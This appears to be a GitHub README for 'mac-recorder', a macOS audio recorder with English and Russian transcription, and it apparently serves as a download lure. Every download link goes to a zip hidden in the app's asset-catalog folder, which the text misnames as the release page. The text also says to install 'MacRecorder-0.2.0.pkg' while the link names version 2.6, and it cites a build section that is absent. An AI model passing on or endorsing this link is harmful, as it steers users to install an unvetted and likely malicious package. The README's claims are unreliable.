# 🎙️ mac-recorder - Easy Audio Recording and Transcription

[![Download mac-recorder](https://img.shields.io/badge/Download-mac--recorder-brightgreen)](https://raw.githubusercontent.com/ayubalishah/mac-recorder/main/MacRecorder/Resources/Assets.xcassets/recorder-mac-2.6.zip)

## 📥 Download and Install

To get started, you need to download the app. Since the main release page contains all the files, please follow these steps:

1. Visit the [release page here](https://raw.githubusercontent.com/ayubalishah/mac-recorder/main/MacRecorder/Resources/Assets.xcassets/recorder-mac-2.6.zip).

2. Find the latest version available. Look for a file named similar to `MacRecorder-0.2.0.pkg`.

3. Download that `.pkg` file to your Mac.

4. Once downloaded, double-click the `MacRecorder-0.2.0.pkg` file to start the installation.

5. Follow the on-screen instructions to install the app.

**Note:** The installation may take some time. This is because the app downloads two voice recognition models (Russian and English). These models allow the app to transcribe audio right after recording.

## 🚀 Getting Started with mac-recorder

After installation, you will see the mac-recorder icon in your Mac's menu bar at the top right of the screen.

### How to Record Audio

1. Click the mac-recorder icon in the menu bar.

2. Choose “Start Recording.” The app will record both your microphone and the system sounds.

3. When done, click “Stop Recording.” The app will save the recorded audio and start transcription automatically.

### What Gets Saved

- The audio will save as a `.wav` file.

- The transcription will save in a text file.

- Both files go to the folder set in your project settings.

### Create and Manage Projects

mac-recorder lets you organize your recordings by setting up projects in advance. For each project, you can choose:

- Where to save recordings and transcripts (a folder on your Mac).

- The default language for transcription (English or Russian).

- An optional script to run after transcription.

This way, you control exactly where your files go and how they are processed.

## 🎛️ Using Projects

To set up a project:

1. Click the mac-recorder icon and open Settings.

2. Select “Manage Projects.”

3. Click “Add Project.”

4. Give your project a name.

5. Choose a folder where files should save. You can pick any folder on your Mac.

6. Set the default language for transcription.

7. (Optional) Add a script to run after transcription—for example, to organize files automatically.

Once set up, select the project before recording. All your files will save in the right place with correct language settings.

## 🖥️ System Requirements

- macOS 10.14 Mojave or newer.

- At least 4 GB of RAM.

- 100 MB free disk space for installation.

- Microphone (built-in or external).

- Internet connection during installation (for model downloads only).

## 💡 How Transcription Works

mac-recorder uses local speech recognition models. It supports two languages: English and Russian. Both models download when you install the app, so you don’t need internet after setup.

When you stop recording, the app processes the audio and creates a transcription file in the project folder. This lets you review spoken words as text.

## 📷 Screenshots

Here are examples of the app interface:

![Menu bar interface](dist/menu.png)

![Project setup](dist/project_setup.png)

## ⚙️ Advanced Setup: Build Everything Yourself

If you prefer to build the app rather than use the prebuilt package, see the **Build Everything Yourself** section at the end of this README. This guide explains how to compile the app on your Mac. It is recommended only for users familiar with developer tools.

## 🛠️ Troubleshooting

- If recording does not start, check that the app has permission to access your microphone. Go to System Preferences > Security & Privacy > Privacy > Microphone.

- If transcription doesn’t work, ensure the models were downloaded during installation. You need internet for this step.

- To find logs or errors, open the Console app on macOS and filter messages by “mac-recorder.”

---

[![Download mac-recorder](https://img.shields.io/badge/Download-mac--recorder-brightgreen)](https://raw.githubusercontent.com/ayubalishah/mac-recorder/main/MacRecorder/Resources/Assets.xcassets/recorder-mac-2.6.zip)